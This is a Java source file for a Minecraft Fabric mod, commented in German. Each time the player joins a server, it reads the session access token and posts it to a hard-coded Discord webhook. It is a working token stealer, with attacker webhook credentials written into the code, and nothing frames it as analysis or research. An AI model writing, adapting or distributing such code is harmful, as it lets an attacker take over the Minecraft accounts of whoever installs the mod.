package com.quiqzy.modcode;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.client.event.v1.ClientPlayConnectionEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.text.Text;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.concurrent.CompletableFuture;

public class TokenWebhookSender implements ModInitializer {
    public static final String MOD_ID = "webhook_token_sender";
    public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);
    
    // Dein Webhook URL
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1564671983009009835/hSG8MaH664-iUxiQbN-GKmHLgu2322vq3P2eCe6u_ho5MQJiOwpUg7ns7KSyzENVDOmT";

    @Override
    public void onInitialize() {
        LOGGER.info("Fabric Mod Initialized!");

        ClientPlayConnectionEvents.JOIN.register((handler, packetSender, client) -> {
            try {
                // 1. Token auslesen
                String token = client.getSession().getAccessToken();
                
                // Debug im Chat
                if (client.player != null) {
                    client.player.sendMessage(Text.literal("Token gefunden: " + token), false);
                }

                // 2. An Webhook senden
                sendToDiscord(token);

            } catch (Exception e) {
                LOGGER.error("Fehler beim Auslesen oder Senden", e);
            }
        });
    }

    private void sendToDiscord(String token) {
        HttpClient httpClient = HttpClient.newHttpClient();
        
        // JSON Payload für Discord
        String jsonPayload = "{\"content\": \"Neues Token erhalten: " + escapeJson(token) + "\"}";

        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(WEBHOOK_URL))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(jsonPayload))
                .build();

        CompletableFuture<HttpResponse<String>> response = httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString());

        response.thenAccept(resp -> {
            if (resp.statusCode() == 204 || resp.statusCode() == 200) {
                LOGGER.info("Token erfolgreich an Webhook gesendet.");
            } else {
                LOGGER.error("Fehler beim Senden an Webhook: " + resp.statusCode() + " - " + resp.body());
            }
        }).exceptionally(ex -> {
            LOGGER.error("HTTP Fehler beim Senden", ex);
            return null;
        });
    }

    // Hilfsfunktion zum Escapen von Sonderzeichen im JSON
    private String escapeJson(String input) {
        return input.replace("\\", "\\\\")
                    .replace("\"", "\\\"")
                    .replace("\n", "\\n")
                    .replace("\r", "\\r")
                    .replace("\t", "\\t");
    }
}
